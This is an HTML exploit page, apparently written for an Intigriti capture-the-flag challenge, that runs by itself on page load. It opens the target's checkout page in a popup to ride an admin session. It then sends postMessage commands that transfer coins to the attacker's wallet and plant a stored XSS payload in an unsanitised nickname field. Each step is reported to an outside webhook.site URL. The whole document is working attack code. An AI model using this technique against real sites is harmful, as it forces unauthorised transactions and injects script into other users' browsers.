<body>
    <h1>EXPLOIT LOADED</h1>
    <div id="log">Initializing...</div>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';

        // XSS Payload - will trigger alert('gigawatz') when transaction loads in marketwatch
        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';

        const logDiv = document.getElementById('log');

        function log(msg, className = '') {
            const timestamp = new Date().toLocaleTimeString();
            logDiv.innerHTML += `<span class="${className}">[${timestamp}] ${msg}</span><br>`;
            console.log(msg);
        }

        function track(step, status, data = {}) {
            const url = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
        }

        async function executeExploit() {
            log('Starting XSS exploit via postMessage...', 'info');
            track('start', 'admin_visited_exploit', { wallet: YOUR_WALLET });

            // Open checkout.html in popup - inherits admin session via SameSite=Lax
            const checkoutUrl = `${BASE}/checkout.html?currency=1337COIN&price=1337`;
            log(`Opening checkout in popup...`, 'info');

            const popup = window.open(checkoutUrl, 'checkout', 'width=1000,height=800');

            if (!popup) {
                log('ERROR: Popup blocked! Please allow popups.', 'error');
                track('error', 'popup_blocked', {});
                return;
            }

            log('Popup opened - admin session inherited', 'success');
            track('popup_opened', 'success', {});

            // Wait for popup to load, then send malicious postMessage
            // We need to send TWO transactions

            setTimeout(async () => {
                // Transaction 1: Send 1337COIN to your wallet
                log('Sending TX #1: 1337COIN to ' + YOUR_WALLET, 'info');
                track('tx1_start', 'sending_coins', { to: YOUR_WALLET });

                popup.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1337,
                        nickname: 'CTF Player'
                    }
                }, '*');

                log('TX #1 sent via postMessage', 'success');
                track('tx1_sent', 'postMessage_sent', { to: YOUR_WALLET });

                // Wait a bit, then send TX #2
                await new Promise(r => setTimeout(r, 1500));

                // Transaction 2: Send 1337COIN to xss-payload with XSS in nickname
                log('Sending TX #2: XSS payload injection...', 'info');
                track('tx2_start', 'injecting_xss', { payload: XSS_PAYLOAD });

                popup.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: 'xss-payload',
                        currency: '1337COIN',
                        amount: 1337,
                        nickname: XSS_PAYLOAD  // UNSANITIZED in marketwatch.html:326-328
                    }
                }, '*');

                log('TX #2 sent - XSS injected in nickname!', 'success');
                track('tx2_sent', 'xss_injected', {
                    payload: XSS_PAYLOAD,
                    trigger: 'marketwatch_nickname_field'
                });

                // Final tracking
                track('complete', 'exploit_complete', {
                    message: 'Admin must visit marketwatch to trigger XSS',
                    expected_alert: 'gigawatz'
                });

                log('EXPLOIT COMPLETE!', 'success');
                log('Transactions submitted:', 'info');
                log('  1. 1337COIN -> ' + YOUR_WALLET, 'info');
                log('  2. 1337COIN -> xss-payload (XSS in nickname)', 'info');
                log('', '');
                log('When admin visits marketwatch.html:', 'info');
                log('  XSS will trigger: alert("gigawatz")', 'success');

            }, 3000);

            // Close popup after completion
            setTimeout(() => {
                if (popup && !popup.closed) {
                    popup.close();
                    log('Popup closed', 'info');
                }
            }, 8000);
        }

        // Auto-execute on page load
        window.addEventListener('load', () => {
            setTimeout(executeExploit, 500);
        });
    </script>
</body>
</html>
